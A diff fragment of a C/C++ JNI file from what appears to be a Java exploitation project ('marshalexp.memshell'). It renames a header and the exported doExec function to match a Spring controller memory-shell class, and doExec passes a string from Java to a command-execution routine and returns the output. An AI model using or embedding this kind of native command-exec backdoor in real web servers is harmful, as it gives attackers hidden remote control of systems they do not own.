@@ -2,7 +2,7 @@
 #include<stdio.h>
 #include<cstdlib>
 #include<cstring>
-#include "xyz_eki_marshalexp_memshell_MSpringJNIController.h"
+#include "xyz_eki_marshalexp_memshell_SpringBoot_Controller_SpringControllerJNIMemshell.h"
 
 int execmd(const char *cmd, char *result)
 {
@@ -23,7 +23,7 @@ int execmd(const char *cmd, char *result)
 }
 
 
-JNIEXPORT jstring JNICALL Java_xyz_eki_marshalexp_memshell_MSpringJNIController_doExec(JNIEnv *env, jobject thisObj,jstring jstr) {
+JNIEXPORT jstring JNICALL Java_xyz_eki_marshalexp_memshell_SpringBoot_Controller_SpringControllerJNIMemshell_doExec(JNIEnv *env, jobject thisObj,jstring jstr) {
     const char *cstr = env->GetStringUTFChars(jstr, NULL);
     char result[1024 * 12] = ""; //定义存放结果的字符串数组
     if (1 == execmd(cstr, result))
